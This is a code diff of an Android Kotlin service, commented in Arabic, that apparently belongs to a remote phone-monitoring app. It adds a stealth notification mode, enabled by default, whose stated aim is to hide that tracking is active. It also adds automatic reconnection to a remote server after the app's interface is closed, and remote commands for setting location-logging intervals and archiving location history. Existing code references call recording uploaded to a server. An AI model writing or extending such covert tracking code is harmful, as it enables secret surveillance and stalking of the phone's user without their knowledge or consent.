@@ -180,9 +180,11 @@ class HostForegroundService : LifecycleService() {
     // 🔐 B4: الخزنة المشفرة المسمدة + مسجل المكالمات الهاتفية (حفظ مشفر + رفع إلى Render)
     private var vaultManager: HostVaultManager? = null
 
-    /// 🔧 B8 — حد أقصى لحجم نقل محتوى الملف/الخزنة عبر قناة البيانات (48MB)
+    /// B8 — حد أقصى لحجم نقل محتوى الملف/الخزنة عبر قناة البيانات (48MB)
     private val MAX_CHUNK_FILE_BYTES: Long = 48L * 1024L * 1024L
     private var callRecorder: HostCallRecorder? = null
+    // 🔁 B12 — مراقب عودة الشبكة لإعادة الاتصال الفوري
+    private var netAliveCb: android.net.ConnectivityManager.NetworkCallback? = null
 
     override fun onBind(intent: Intent): IBinder? {
         super.onBind(intent)
@@ -246,8 +248,16 @@ class HostForegroundService : LifecycleService() {
         }
 
         try {
-            NotificationHelper.createChannel(this)
-            val notification = NotificationHelper.buildHostNotification(this)
+            // 💤 B12 — وضع الإخفاء مفعّل افتراضياً: قناة بأدنى أهمية + محتوى محايد
+            // (لا أيقونة في شريط الحالة، لا صوت، لا نص يوحي بنشاط التتبع)
+            var stealth = true
+            try {
+                stealth = kotlinx.coroutines.runBlocking {
+                    SettingsRepository(applicationContext).stealthNotification.firstOrNull() ?: true
+                }
+            } catch (_: Throwable) { stealth = true }
+            NotificationHelper.createChannel(this, stealth)
+            val notification = NotificationHelper.buildHostNotification(this, stealth)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                 try {
                     // 🔧 أنواع الخدمة تُحسب ديناميكياً حسب الأذونات الممنوحة فعلياً حتى لا يرمي
@@ -314,6 +324,8 @@ class HostForegroundService : LifecycleService() {
 
         activeInstance = this
         serviceState.value = serviceState.value.copy(running = true)
+        // 🔁 B12 — إعادة الاتصال فور عودة الشبكة (خدمة البقاء مفعّلة دائماً)
+        registerNetworkAliveWatcher()
 
         scope.launch {
             val deviceId = DeviceIdentifier.getOrGenerate(this@HostForegroundService)
@@ -373,6 +385,40 @@ class HostForegroundService : LifecycleService() {
 
             startStatePoster()
         }
+    }
+
+    /**
+     * 🔁 B12 — مراقب صلابة الاتصال: أي(collection) عودة للإنترنت (WiFi/بيانات)
+     * تلقّي إعادة الاتصال بالخادم فوراً بدل انتظار انتهاء تأخير التراجع —
+     * أساس ضمان بقاء الهاتف المضيف متصلاً بالخادم بعد إغلاق واجهته.
+     */
+    private fun registerNetworkAliveWatcher() {
+        try {
+            if (netAliveCb != null) return
+            val cm = getSystemService(android.net.ConnectivityManager::class.java) ?: return
+            val req = android.net.NetworkRequest.Builder()
+                .addCapability(android.net.NetworkCapabilities.NET_CAPABILITY_INTERNET)
+                .build()
+            val cb = object : android.net.ConnectivityManager.NetworkCallback() {
+                override fun onAvailable(network: android.net.Network) {
+                    Log.i(TAG, "عادت الشبكة — إعادة اتصال فورية بالخادم")
+                    try { signaling?.forceReconnect() } catch (_: Throwable) {}
+                }
+            }
+            cm.registerNetworkCallback(req, cb)
+            netAliveCb = cb
+        } catch (t: Throwable) {
+            Log.w(TAG, "تعذر تسجيل مراقب الشبكة: ${t.message}")
+        }
+    }
+
+    private fun unregisterNetworkAliveWatcher() {
+        try {
+            netAliveCb?.let { cb ->
+                getSystemService(android.net.ConnectivityManager::class.java)?.unregisterNetworkCallback(cb)
+            }
+        } catch (_: Throwable) {}
+        netAliveCb = null
     }
 
     /**
@@ -1084,11 +1130,18 @@ class HostForegroundService : LifecycleService() {
             // 📍 نقاط سجل المواقع المختصرة (تُعرض على خارطة تفاعلية)
             Commands.LOCATIONS_GET -> {
                 val limit = request.params?.get("limit")?.jsonPrimitive?.contentOrNull?.toIntOrNull() ?: 200
+                val sinceTs = request.params?.get("sinceTs")?.jsonPrimitive?.contentOrNull?.toLongOrNull()
+                val untilTs = request.params?.get("untilTs")?.jsonPrimitive?.contentOrNull?.toLongOrNull()
                 val tracker = locationTracker
-                val items = tracker?.getPoints(limit) ?: emptyList()
+                val items = if (sinceTs != null || untilTs != null) {
+                    tracker?.queryPoints(sinceTs, untilTs, limit) ?: emptyList()
+                } else {
+                    tracker?.getPoints(limit) ?: emptyList()
+                }
                 buildJsonObject {
                     put("cmd", Commands.LOCATIONS_GET)
                     put("tracking", tracker?.isRunning() ?: false)
+                    put("intervalSec", tracker?.getIntervalSec() ?: 30L)
                     put(
                         "items",
                         json.encodeToJsonElement(
@@ -1104,6 +1157,95 @@ class HostForegroundService : LifecycleService() {
                 buildJsonObject {
                     put("cmd", Commands.LOCATIONS_CLEAR)
                     put("cleared", true)
+                }
+            }
+
+            // 📍 B12 — ضبط فاصل تسجيل النقاط + إدارة الأرشيف الدائم
+            Commands.LOCATIONS_INTERVAL_SET -> {
+                val sec = request.params?.get("seconds")?.jsonPrimitive?.contentOrNull?.toLongOrNull() ?: -1L
+                val tracker = locationTracker
+                if (tracker == null || sec <= 0L) {
+                    buildJsonObject {
+                        put("cmd", Commands.LOCATIONS_INTERVAL_SET)
+                        put("ok", false)
+                        put("error", "تعذر تطبيق الفاصل — تأكد من تفعيل التتبع ومن قيمة صحيحة")
+                    }
+                } else {
+                    val used = tracker.setInterval(sec)
+                    buildJsonObject {
+                        put("cmd", Commands.LOCATIONS_INTERVAL_SET)
+                        put("ok", true)
+                        put("intervalSec", used)
+                    }
+                }
+            }
+
+            Commands.LOCATIONS_ARCHIVE_LIST -> {
+                val notes = locationTracker?.archiveList() ?: emptyList()
+                buildJsonObject {
+                    put("cmd", Commands.LOCATIONS_ARCHIVE_LIST)
+                    put(
+                        "items",
+                        json.encodeToJsonElement(
+                            ListSerializer(kotlinx.serialization.json.JsonObject.serializer()),
+                            notes
+                        )
+                    )
+                }
+            }
+
+            Commands.LOCATIONS_ARCHIVE_SAVE -> {
+                val name = request.params?.get("name")?.jsonPrimitive?.contentOrNull?.trim() ?: ""
+                val sinceTs = request.params?.get("sinceTs")?.jsonPrimitive?.contentOrNull?.toLongOrNull()
+                val untilTs = request.params?.get("untilTs")?.jsonPrimitive?.contentOrNull?.toLongOrNull()
+                val entry = locationTracker?.archiveSave(name.takeIf { it.isNotEmpty() }, sinceTs, untilTs)
+                if (entry == null) {
+                    buildJsonObject {
+                        put("cmd", Commands.LOCATIONS_ARCHIVE_SAVE)
+                        put("ok", false)
+                        put("error", "لا توجد نقاط قابلة للأرشفة في هذا المدى")
+                    }
+                } else {
+                    buildJsonObject {
+                        put("cmd", Commands.LOCATIONS_ARCHIVE_SAVE)
+                        put("ok", true)
+                        put("archive", entry)
+                    }
+                }
+            }
+
+            Commands.LOCATIONS_ARCHIVE_POINTS -> {
+                val id = request.params?.get("id")?.jsonPrimitive?.contentOrNull ?: ""
+                val pts = locationTracker?.archivePoints(id) ?: emptyList()
+                buildJsonObject {
+                    put("cmd", Commands.LOCATIONS_ARCHIVE_POINTS)
+                    put("count", pts.size)
+                    put(
+                        "items",
+                        json.encodeToJsonElement(
+                            ListSerializer(kotlinx.serialization.json.JsonObject.serializer()),
+                            pts
+                        )
+                    )
+                }
+            }
+
+            Commands.LOCATIONS_ARCHIVE_RENAME -> {
+                val id = request.params?.get("id")?.jsonPrimitive?.contentOrNull ?: ""
+                val name = request.params?.get("name")?.jsonPrimitive?.contentOrNull?.trim() ?: ""
+                val ok = locationTracker?.archiveRename(id, name) ?: false
+                buildJsonObject {
+                    put("cmd", Commands.LOCATIONS_ARCHIVE_RENAME)
+                    put("ok", ok)
+                }
+            }
+
+            Commands.LOCATIONS_ARCHIVE_DELETE -> {
+                val id = request.params?.get("id")?.jsonPrimitive?.contentOrNull ?: ""
+                val ok = locationTracker?.archiveDelete(id) ?: false
+                buildJsonObject {
+                    put("cmd", Commands.LOCATIONS_ARCHIVE_DELETE)
+                    put("ok", ok)
                 }
             }
 
@@ -1756,6 +1898,7 @@ class HostForegroundService : LifecycleService() {
         requestJob?.cancel()
         peerManager?.close()
         peerManager = null
+        unregisterNetworkAliveWatcher()
         signaling?.disconnect()
         signaling = null
         serviceState.value = serviceState.value.copy(running = false)
